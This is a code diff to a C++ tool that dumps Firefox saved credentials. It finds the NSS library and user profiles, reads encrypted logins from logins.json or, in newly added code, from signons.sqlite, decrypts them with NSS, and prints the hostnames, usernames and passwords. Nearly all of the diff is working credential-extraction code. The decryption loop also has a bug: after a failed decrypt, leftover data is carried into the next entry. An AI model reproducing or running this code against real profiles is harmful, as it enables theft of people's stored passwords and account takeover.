@@ -21,12 +21,12 @@ std::filesystem::path get_nss_location()
             std::cout << "[+] NSS found in " << (local_path / dir).string() << "\n\n";
             return local_path / dir;
         }
-        if (std::filesystem::exists(root_path / dir / "nss3.dll")) {
+        else if (std::filesystem::exists(root_path / dir / "nss3.dll")) {
             std::cout << "[+] NSS found in " << (root_path / dir).string() << "\n\n";
             return root_path / dir;
         }
     }
-    std::cout << "[-] Could not find NSS :( Exiting...\n\n";
+    std::cerr << "[-] Could not find NSS :( Exiting...\n\n";
     exit(1);
 }
 
@@ -58,25 +58,35 @@ std::vector<std::filesystem::path> get_valid_profiles()
             std::cout << "[-] Bad Profile\n";
         }
     }
+    if (valid_profile_list.empty()) {
+        std::cerr << "Could not find a valid profile... Exiting\n";
+        exit(1);
+    }
     return valid_profile_list;
 }
 
 
 int FFBT::retrieve_credentials(std::filesystem::path profile_path, int output_type)
 {
+    // instead do if exists logins.json & signons.sqlite. these try catch are annoying
     std::vector<std::vector<std::string>> encrypted_creds;
     try {
         // check if file exists then throw if not
         encrypted_creds = get_json_credentials(profile_path / "logins.json");
         if (encrypted_creds.empty()) {
             std::cerr << "logins.json exists but is empty or something really fucked up\n";
-            return 1;
+            return 1; // throw to catch
         }
     }
     catch (const nlohmann::json::exception & e) {
         std::cerr << "Error reading logins.json, checking for sqlite database\nError: " << e.what() << std::endl;
         try {
-            //get_sqlite_credentials(profile_path / "signons.sqlite");
+            encrypted_creds = get_sqlite_credentials(profile_path / "signons.sqlite");
+            if (encrypted_creds.empty()) {
+                std::cerr << "signons.sqlite exists but is empty or something really fucked up\n";
+                std::cerr << "Could not retrieve any credentials\n";
+                return 1;
+            }
         }
         catch (...) { // TODO: specific exception
             std::cerr << "Could not retrieve any credentials\n";
@@ -108,49 +118,83 @@ std::vector<std::vector<std::string>> FFBT::get_json_credentials(std::filesystem
     using json = nlohmann::json;
     json data = json::parse(login_file);
     
-    std::vector<std::vector<std::string>> logins;
+    std::vector<std::vector<std::string>> out;
     std::vector<std::string> LD;
 
-    for (auto &login : data["logins"]) {
+    for (auto &login : data["logins"])
+    {
         LD.push_back(login["hostname"]);
         LD.push_back(login["encryptedUsername"]);
         LD.push_back(login["encryptedPassword"]);
         LD.push_back(std::to_string((int)login["encType"]));
-        logins.push_back(LD);
+
+        out.push_back(LD);
         LD.clear();
     }
-    return logins;
+    return out;
 }
 
 std::vector<std::vector<std::string>> FFBT::get_sqlite_credentials(std::filesystem::path signons_path)
 {
     std::vector<std::vector<std::string>> out;
+    std::vector<std::string> LD;
+    sqlite3* db; sqlite3_stmt* statement;
+
+    if (sqlite3_open(signons_path.string().c_str(), &db) != SQLITE_OK) {
+        std::cerr << "Could not open database\n";
+        return out;
+    }
+    if (sqlite3_prepare_v2(db, "SELECT hostname, encryptedUsername, encryptedPassword, encType FROM moz_logins", -1, &statement, NULL) != SQLITE_OK) {
+        std::cerr << "Error with SQL statement\n";
+        return out;
+    }
+
+    int sql_ret = 0;
+    int ncols = sqlite3_column_count(statement);
+    while ((sql_ret = sqlite3_step(statement)) == SQLITE_ROW)
+    {
+        for (int i = 0; i < 4; i++)
+        {
+            LD.push_back(std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, i))));
+        }
+        out.push_back(LD);
+        LD.clear();
+    }
+    if (sql_ret != SQLITE_DONE) {
+        std::cerr << "error performing sql query: " << sqlite3_errmsg(db) << "\n";
+        std::cerr << "ret: " << sql_ret << "\n";
+        std::cerr << "returning vector anyway\n\n";
+    }
     return out;
 }
 
 std::vector<std::vector<std::string>> FFBT::decrypt_credentials(std::vector<std::vector<std::string>> encrypted_creds)
 {
-    std::vector<std::vector<std::string>> out; int site_d = 0;
+    std::vector<std::vector<std::string>> out;
+    std::vector<std::string> data;
 
     for (auto &site_e : encrypted_creds)
     {
+        //site_d++;
+        data.push_back(site_e[0]);
         if (std::stoi(site_e[3])) { // if it has encryption
             try {
-                out[site_d][0] = site_e[0];
-                out[site_d][1] = Decrypt(site_e[1]);
-                out[site_d][2] = Decrypt(site_e[2]);
+                data.push_back(Decrypt(site_e[1]));
+                data.push_back(Decrypt(site_e[2]));
             }
             catch (const std::exception& e) {
                 std::cerr << "Decryption failed for '" << site_e[0] << "' with Error: " << e.what() << "\n";
-                ++site_d; continue;
+                //++site_d;
+                continue;
             }
         }
         else {
             //std::cout << "[+] Username and Password are not encrypted\n";
-            out[site_d][1] = site_e[1];
-            out[site_d][2] = site_e[2];
+            data.push_back(site_e[1]);
+            data.push_back(site_e[2]);
         }
-        ++site_d;
+        out.push_back(data);
+        data.clear();
     }
     std::cout << "\n\n=========== DECRYPTED ===========\n";
     for (auto &site : out)
